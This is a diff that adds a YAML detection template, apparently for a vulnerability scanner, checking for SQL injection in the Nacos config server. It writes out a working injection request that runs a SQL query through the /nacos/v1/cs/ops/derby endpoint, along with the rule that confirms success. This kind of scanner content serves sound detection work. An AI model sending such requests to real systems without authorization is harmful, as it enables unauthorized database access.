@@ -1,0 +1,19 @@
+id: nacos-config-server-sql-inject
+
+info:
+  name: Nacos Config Server SQL Injection
+  author: zan8in
+  severity: high
+  verified: true
+  reference:
+    - https://mp.weixin.qq.com/s/NgWvrN6yW-MAy0Cch4_nAQ
+  tags: nacos,sqli
+  created: 2023/06/01
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /nacos/v1/cs/ops/derby?sql=select%20count(*)%20as%20SCAN_CHECK%20from%20users
+    expression: response.status == 200 && response.body.bcontains(b'"code":') && response.body.bcontains(b'"SCAN_CHECK":')
+expression: r0()
